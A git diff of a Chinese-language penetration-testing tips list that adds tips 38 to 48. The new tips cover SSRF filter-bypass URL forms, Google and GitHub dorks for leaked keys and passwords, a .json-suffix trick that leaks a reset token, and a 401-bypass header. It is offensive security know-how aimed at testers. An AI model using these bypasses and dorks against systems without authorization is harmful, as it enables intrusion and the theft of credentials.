@@ -1,4 +1,4 @@
-# 渗透测试Tips - Version1.0（后续进行分类，以及美化格式）
+# 渗透测试Tips - Version1.3（后续进行分类，以及美化格式）
 ## 希望师傅们可以分享一些个人渗透测试Tips，提交方式在下面
 ## 食用指南&前言
 
@@ -209,6 +209,116 @@ curl https://www.xxxx.com -H "Origin: https://test.com" -I
 ```
 
 37、在盲测目标系统是否为Shiro时，可以在Cookie中手动构造`rememebrMe=xxx`，如果返回包中Set-Cookie中存在`rememberMe=deleteMe`，则证明该系统使用了Shiro，因此可以进一步攻击。
+38、使用正则获取网站中所包含的其他URL：
+
+```
+cat file | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
+
+curl http://host.xx/file.js | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
+```
+
+39、常见的一些远程命令执行（RCE）参数，详情，请看dicts目录下的RCE-extentions.txt文件。
+
+40、绕过SSRF防护的几个小方法：
+
+```
+A、绕过SSRF限制通过CIDR，如：
+http://127.127.127.127
+http://127.0.0.0
+
+B、不完整的地址，如：
+http://127.1
+http://0
+
+C、将地址结合在通过特殊字符结合在一起，如：
+http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
+urllib : 3.3.3.3
+
+D、绕过解析器，如：
+http://127.1.1.1:80\@127.2.2.2:80/
+
+E、绕过localhost通过[::]，如：
+http://[::]:80/
+http://0000::1:80/
+
+```
+
+41、几个常用的Google语法：
+
+```
+inurl:example.com intitle:"index of"
+inurl:example.com intitle:"index of /" "*key.pem"
+inurl:example.com ext:log
+inurl:example.com intitle:"index of" ext:sql|xls|xml|json|csv
+inurl:example.com "MYSQL_ROOT_PASSWORD:" ext:env OR ext:yml -git
+```
+
+42、通过对比favicon的hash对比相关联的网站：
+
+```
+脚本地址：https://github.com/m4ll0k/Bug-Bounty-Toolz/blob/master/favihash.py
+命令：python3 favihash.py -f https://target/favicon.ico -t targets.txt -s
+```
+
+43、一些本地包含参数，详情请看dicts目录下的LFI-extentions.txt文件。
+
+44、在JavaScript文件中可以找一些隐藏的GET参数，比如：
+
+```
+首先，在js文件中找到一些变量，比如：var test="xss"
+然后，可以尝试使用GET方法构造每一个参数，比如：
+https://example.com/?test=”xsstest
+本方法可能会发现一些XSS
+```
+
+45、使用github dorks帮助我们寻找一些敏感信息，比如：
+
+```
+extension:pem private
+extension:ppk private
+extension:sql mysql dump password
+extension:json api.forecast.io
+extension:json mongolab.com
+extension:yaml mongolab.com
+extension:ica [WFClient] Password=
+extension:avastlic “support.avast.com”
+extension:js jsforce conn.login
+extension:json googleusercontent client_secret
+“target.com” send_keys
+“target.com” password
+“target.com” api_key
+“target.com” apikey
+“target.com” jira_password
+“target.com” root_password
+“target.com” access_token
+“target.com” config
+“target.com” client_secret
+“target.com” user auth
+通过上述语法，可以搜索到一些敏感的私钥，一些SSH登录私钥，mysql的数据库密码，API key等等。
+另外推荐一个脚本：https://github.com/techgaun/github-dorks
+```
+
+46、SSRF常见的参数，详情请看dicts目录下的SSRF-extensions.txt文件。
+
+47、通过添加`.json`后缀，泄露一些敏感信息，比如：
+
+```
+一次正常请求：
+GET /ResetPassword HTTP/1.1
+{"email":"victim@example.com"}
+响应：
+HTTP/1.1 200 OK
+
+添加.json后缀的请求：
+GET /ResetPassword.json HTTP/1.1
+{"email":"victim@example.com"}
+响应：
+HTTP/1.1 200 OK
+{"success":"true","token":"596a96-cc7bf-9108c-d896f-33c44a-edc8a"}
+原链接：https://twitter.com/SalahHasoneh1/status/1293918353971531776
+```
+
+48、如果响应为401，可以试试在请求头中添加`X-Custom-IP-Authorization: 127.0.0.1`
 
 ----------------------------------------
 ### 2021年01月21日 - 更新分界线，整理了来自Tools师傅们留言的渗透测试Tips：
@@ -277,6 +387,8 @@ sort out.txt | uniq > out2.txt
 2021年01月21日 - 整理来自tools师傅们留言的渗透测试Tips
 
 2021年01月26日 - 整理了几天来自tools师傅们的留言以及个人的渗透测试Tips
+
+2021年01月28日 - 整理更新了第38~48，所学习到的渗透测试Tips.
 
 # 贡献个人（排名不分先）
 
